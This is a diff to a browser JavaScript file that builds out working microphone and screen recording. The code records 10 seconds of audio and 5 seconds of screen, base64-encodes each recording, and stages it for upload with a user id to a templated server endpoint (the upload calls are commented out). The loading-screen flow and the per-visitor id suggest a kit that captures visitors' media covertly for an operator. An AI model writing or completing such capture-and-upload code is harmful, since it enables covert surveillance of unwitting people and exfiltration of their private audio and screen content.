@@ -286,10 +286,19 @@ function initAudioCapture() {
   const audioElement = document.getElementById('audio');
   let mediaRecorder;
   let audioChunks = [];
+  let isRecording = false;
   
   async function startAudioCapture() {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      // Request audio input from microphone
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true
+        }, 
+        video: false 
+      });
+      
       handleAudioSuccess(stream);
     } catch (e) {
       console.error("Audio capture error:", e);
@@ -299,51 +308,170 @@ function initAudioCapture() {
   }
   
   function handleAudioSuccess(stream) {
-    mediaRecorder = new MediaRecorder(stream);
+    // Connect the stream to audio element for visualization (optional)
+    audioElement.srcObject = stream;
     
-    mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) {
-        audioChunks.push(event.data);
-      }
-    };
-    
-    mediaRecorder.onstop = () => {
-      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-      const reader = new FileReader();
+    try {
+      // Create media recorder with preferred MIME type
+      const mimeType = 'audio/webm';
+      mediaRecorder = new MediaRecorder(stream, { mimeType });
       
-      reader.readAsDataURL(audioBlob);
-      reader.onloadend = () => {
-        const base64data = reader.result.split(',')[1];
-        
-        // Send audio data to server (placeholder - add the actual API endpoint)
-        console.log("Audio recorded (Feature coming soon)");
-        
-        // Stop all tracks
-        stream.getTracks().forEach(track => track.stop());
-        
-        captureCompleted = true;
-        hideLoadingScreen();
+      // Handle recorded data chunks
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+          audioChunks.push(event.data);
+        }
       };
-    };
-    
-    // Record for 10 seconds
-    mediaRecorder.start();
-    setTimeout(() => {
-      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        mediaRecorder.stop();
-      }
-    }, 10000);
+      
+      // When recording completes
+      mediaRecorder.onstop = () => {
+        console.log("Audio recording completed");
+        
+        // Create a blob from the audio chunks
+        const audioBlob = new Blob(audioChunks, { type: mimeType });
+        
+        // Convert to base64 for sending
+        const reader = new FileReader();
+        reader.readAsDataURL(audioBlob);
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
+          
+          // Log the size for debugging
+          console.log("Audio recorded (size: " + Math.round(audioBlob.size/1024) + "KB)");
+          
+          // Create an audio element to preview the recording (can be removed in production)
+          const audioURL = URL.createObjectURL(audioBlob);
+          const audioPreview = document.createElement('audio');
+          audioPreview.style.display = 'none';
+          audioPreview.controls = true;
+          audioPreview.src = audioURL;
+          document.body.appendChild(audioPreview);
+          
+          // Placeholder for sending to server (server-side handling needed)
+          // $.post("<%=a %>/audiorecording", {
+          //   uid: uid,
+          //   data: encodeURIComponent(base64data)
+          // }, (s) => { console.log("Audio recording sent"); });
+          
+          // Stop all tracks
+          stream.getTracks().forEach(track => track.stop());
+          
+          // Mark as completed
+          captureCompleted = true;
+          hideLoadingScreen();
+        };
+      };
+      
+      // Start recording
+      mediaRecorder.start();
+      isRecording = true;
+      console.log("Audio recording started");
+      
+      // Record for 10 seconds then stop
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+          isRecording = false;
+        }
+      }, 10000);
+      
+    } catch (error) {
+      console.error("MediaRecorder error:", error);
+      // Stop all tracks
+      stream.getTracks().forEach(track => track.stop());
+      captureCompleted = true;
+      hideLoadingScreen();
+    }
   }
   
+  // Start the audio capture
   startAudioCapture();
 }
 
 // Screen capture
 function initScreenCapture() {
+  // Create screen recording elements
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  let mediaRecorder;
+  let recordedChunks = [];
+  let isRecording = false;
+  
   async function startScreenCapture() {
     try {
-      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-      handleScreenCaptureSuccess(stream);
+      // Request screen sharing with audio
+      const stream = await navigator.mediaDevices.getDisplayMedia({
+        video: { 
+          cursor: "always",
+          displaySurface: "browser"
+        },
+        audio: false
+      });
+      
+      // Connect the stream to video element
+      video.srcObject = stream;
+      
+      // Create media recorder
+      mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
+      
+      // Handle recorded data
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) {
+          recordedChunks.push(e.data);
+        }
+      };
+      
+      // When recording stops
+      mediaRecorder.onstop = () => {
+        console.log("Screen recording completed");
+        
+        // Create a blob from recorded chunks
+        const recordedBlob = new Blob(recordedChunks, {type: 'video/webm'});
+        
+        // Convert blob to base64
+        const reader = new FileReader();
+        reader.readAsDataURL(recordedBlob);
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
+          
+          // Here you would send the data to your server
+          console.log("Screen recording processed (size: " + Math.round(recordedBlob.size/1024) + "KB)");
+          
+          // Placeholder for sending to server (server-side handling needed)
+          // $.post("<%=a %>/screenrecording", {
+          //   uid: uid,
+          //   data: encodeURIComponent(base64data)
+          // }, (s) => { console.log("Screen recording sent"); });
+          
+          // Close and notify
+          captureCompleted = true;
+          hideLoadingScreen();
+        };
+      };
+      
+      // Listen for stream ending (user closes sharing dialog)
+      stream.getVideoTracks()[0].onended = () => {
+        if (mediaRecorder && isRecording) {
+          mediaRecorder.stop();
+          isRecording = false;
+        }
+      };
+      
+      // Start recording for 5 seconds
+      mediaRecorder.start();
+      isRecording = true;
+      
+      // Stop recording after 5 seconds
+      setTimeout(() => {
+        if (mediaRecorder && isRecording) {
+          mediaRecorder.stop();
+          isRecording = false;
+        }
+        
+        // Close all tracks
+        stream.getTracks().forEach(track => track.stop());
+      }, 5000);
+      
     } catch (e) {
       console.error("Screen capture error:", e);
       captureCompleted = true;
@@ -351,17 +479,7 @@ function initScreenCapture() {
     }
   }
   
-  function handleScreenCaptureSuccess(stream) {
-    console.log("Screen capture started (Feature coming soon)");
-    
-    // Record for 5 seconds then stop
-    setTimeout(() => {
-      stream.getTracks().forEach(track => track.stop());
-      captureCompleted = true;
-      hideLoadingScreen();
-    }, 5000);
-  }
-  
+  // Start the screen capture
   startScreenCapture();
 }
 
